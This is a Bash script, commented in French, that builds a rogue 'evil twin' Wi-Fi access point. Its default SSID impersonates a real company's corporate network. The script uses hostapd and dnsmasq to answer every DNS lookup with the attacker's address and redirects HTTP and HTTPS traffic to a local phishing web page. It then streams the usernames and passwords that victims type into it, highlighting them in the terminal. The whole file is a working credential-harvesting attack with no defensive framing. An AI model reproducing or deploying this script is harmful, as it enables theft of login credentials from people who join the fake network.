#!/bin/bash

# Définition des codes de couleur
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

clear 

IFACE="wlp1s0"                  
FAKE_IP="192.168.50.1"          
WEBROOT="/srv/http/"  
DNSMASQ_CONF="/tmp/dnsmasq_ev.conf" 
HOSTAPD_CONF="/tmp/hostapd_ev.conf" 
LOGFILE="/srv/http/log.txt"

# Demander le SSID à l'utilisateur
read -p "Entrez le nom du SSID pour le point d'accès : " SSID
if [ -z "$SSID" ]; then
    echo -e "${RED}Erreur : Aucun SSID saisi. Utilisation du SSID par défaut 'AirLiquide-Corporate'.${NC}"
    SSID="AirLiquide-Corporate"
    	
fi

clear

cleanup() {
    echo -e "${GREEN}[+] Arrêt des services...${NC}"
    killall dnsmasq hostapd 2>/dev/null
    ip link set "$IFACE" down
    ip addr flush dev "$IFACE"
    systemctl restart httpd 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo -e "${GREEN}[+] Rétablissement de la configuration réseau...${NC}"
    ip link set "$IFACE" up
    systemctl restart NetworkManager
    clear
}

start_fake_wifi() {
    echo -e "${GREEN}[+] Nettoyage du fichier log${NC}"
    sudo rm /srv/http/log.txt
    touch /srv/http/log.txt
    echo -e "${GREEN}[+] Kill des processus gênants...${NC}"
    sudo airmon-ng check kill 
    ip addr flush dev "$IFACE"
    ip link set "$IFACE" down
    ip addr add "$FAKE_IP/24" dev "$IFACE"
    ip link set "$IFACE" up
    echo 1 > /proc/sys/net/ipv4/ip_forward
    echo -e "${GREEN}[+] Configuration iptables...${NC}"
    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-ports 80 
    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j DNAT --to-destination "$FAKE_IP":80
    sudo iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE        
    touch "$LOGFILE"
    chmod 666 "$LOGFILE"
    chown -R http:http "$WEBROOT"
    echo -e "${GREEN}[+] Démarrage d'Apache...${NC}"
    systemctl restart httpd
    echo -e "${GREEN}[+] Lancement de dnsmasq...${NC}"
    cat > "$DNSMASQ_CONF" <<EOF
interface=$IFACE
dhcp-range=192.168.50.10,192.168.50.100,12h
dhcp-option=3,$FAKE_IP
dhcp-option=6,$FAKE_IP
address=/#/$FAKE_IP
log-queries
log-dhcp
EOF
    dnsmasq -C "$DNSMASQ_CONF" &
    echo -e "${GREEN}[+] Lancement de hostapd...${NC}"
    cat > "$HOSTAPD_CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
EOF
    echo -e "${GREEN}[+] Nom du SSID : ${CYAN}$SSID${NC}"
    hostapd "$HOSTAPD_CONF" > /dev/null 2>&1 &
    echo -e "${GREEN}[+] Capturation des identifiants en temps réel...${NC}"
    tail -f "$LOGFILE" | sed -E "s/(username|password|login|pass|user)=[^ ]*/${RED}&${NC}/g"
}

trap cleanup EXIT
start_fake_wifi
